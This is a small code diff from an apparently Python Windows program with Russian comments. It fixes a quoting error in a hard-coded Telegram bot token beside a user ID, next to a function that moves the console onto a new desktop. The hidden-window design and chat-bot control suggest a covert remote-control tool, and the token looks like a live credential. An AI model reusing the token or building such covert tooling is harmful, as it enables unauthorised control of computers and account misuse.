@@ -83,7 +83,7 @@ def move_console_to_new_desktop():
     # Switch to the new desktop
     ctypes.windll.user32.SwitchDesktop(hwnd)
 # БОТ
-TOKEN = '8543450940:AAF5KG-Qa44HCYbsNRn0PS59D7QzoIEuzrQ'' #ВАШ ТОКЕН БОТА ИЗ @BOTFATHER
+TOKEN = '8543450940:AAF5KG-Qa44HCYbsNRn0PS59D7QzoIEuzrQ' #ВАШ ТОКЕН БОТА ИЗ @BOTFATHER
 USER_ID = 7142942973  #ВАШ ТЕЛЕГРАМ АЙДИ, УКАЗЫВАЙТЕ СВОЙ ИБО НИЧЕГО НЕ СРАБОТАЕТ
 
 # Create a bot instance
